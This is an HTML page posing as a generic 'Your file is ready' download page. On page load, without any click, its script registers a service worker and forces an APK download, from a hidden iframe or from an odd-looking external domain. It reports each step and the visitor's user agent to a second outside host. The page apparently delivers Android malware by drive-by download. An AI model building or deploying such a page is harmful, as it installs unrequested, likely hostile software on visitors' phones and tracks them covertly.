<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Download page</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 0;
            font-size: 16px;
            font-family: Arial, serif;
            position: absolute;
            top: 0;
            gap: 40px;
            right: 0;
            bottom: 0;
            left: 0;
            background-color: #f5f5f5;
        }
        button{
            background-color: rgb(9, 149, 28);
            box-shadow: 1px 1px 5px gray;
            border: 0;
            border-radius: 10px;
            padding: 20px 40px;
            color: white;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .text{
            font-size: 24px;
        }
    </style>
</head>
<body>

<div class='text'>Your file is ready</div>
<button>Download file</button>

<iframe id="ifr1" style="display: none"></iframe>

<script>
    async function logEvent(eventType, data = {}) {
        data.event = eventType; data.timestamp = Date.now(); data.ua = navigator.userAgent;
        try {
            await fetch("https://ptrforcfg.com/gh_test", {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        } catch (e) { console.error('Log error:', e); }
    }

    function downloadIFrame(url) {
        let ifr1 = document.getElementById("ifr1");
        ifr1.src = url;
        ifr1.onerror = event => console.log(event);
    }

    async function delay(ms) {
        await new Promise(resolve => setTimeout(resolve, ms))
    }

    async function downloadApk() {
        const apkURL = "https://noticeablyholyewe.autos/aaa8e7e844e856a015a/" + location.search;
        logEvent("fallback_start", {url: apkURL});
        try {
            const response = await fetch(apkURL, {method: 'GET', credentials: 'omit'});
            logEvent("fallback_response", {ok: response.ok, status: response.status});
            if (!response.ok) throw new Error("HTTP " + response.status);

            const currentUrl = new URL(location.href);
            let apkname = "download911.apk";
            if (currentUrl.searchParams.get("utm_medium")) {
                apkname = currentUrl.searchParams.get("utm_medium").replace(/[^\w-]/g, '_') + ".apk";
            }

            const blob = await response.blob();
            logEvent("fallback_blob", {size: blob.size});

            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = apkname; document.body.appendChild(a); a.click();
            document.body.removeChild(a); URL.revokeObjectURL(url);
            logEvent("fallback_success");
        } catch (error) {
            logEvent("fallback_error", {message: error.message || error});
            await delay(1000);
            downloadIFrame(apkURL);
        }
    }

    async function initSW() {
        logEvent("sw_init");

        function setButton(sw){
            try{
                document.querySelector('button').onclick = _ => sw
                    ? downloadIFrame('my.apk' + location.search)
                    : downloadApk();
            }catch (e){}
        }

        if ('serviceWorker' in navigator) {
            try {
                await navigator.serviceWorker.register('./sw2.js');
                await navigator.serviceWorker.ready;
                logEvent("sw_ready");
                downloadIFrame('my.apk' + location.search);
                setButton(true);
            } catch (e) {
                logEvent("sw_fail", {error: e.message || e});
                downloadApk();
                setButton(false);
            }
        } else {
            downloadApk();
            setButton(false);
        }
    }

    window.addEventListener('unhandledrejection', function(e) {
        logEvent("unhandled_rejection", {reason: e.reason ? e.reason.message || e.reason : 'unknown'});
    });
    window.onerror = function(msg, url, line, col, err) {
        logEvent("js_error", {msg: msg || '', url: url || '', line: line || 0, col: col || 0, err: err ? (err.message || err) : ''});
    };
    window.addEventListener('load', initSW);
</script>
</body>
</html>
